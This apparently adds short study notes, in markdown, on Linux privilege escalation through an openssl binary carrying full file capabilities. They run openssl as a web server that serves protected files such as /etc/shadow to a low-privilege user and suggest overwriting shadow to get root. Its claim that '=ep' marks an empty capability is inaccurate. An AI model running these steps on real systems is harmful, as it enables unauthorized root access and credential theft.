@@ -1,0 +1,14 @@
+# Linux capabilities priv esc using openssl
+
+https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099
+
+1. getcap -r / 2>/dev/null
+2. Specifically looking at /home/user/openssl =ep
+3. This means it's an empty capability
+4. Bascially we can run it from the root directory and it can inherit privileges when it runs and we get it all!!!
+5.  /home/user/openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 1337 -HTTP
+6. Remember run it from where it is stored in this case our home directory and not from /usr/bin
+7. Connect to the machine from another low-priv user shell
+8. curl -k "https://127.0.0.1:1337/etc/sudo.conf"
+9. You have all the files you need.
+10. you can write to /etc/shadow if you'd like spawn/escalate to a root shell.
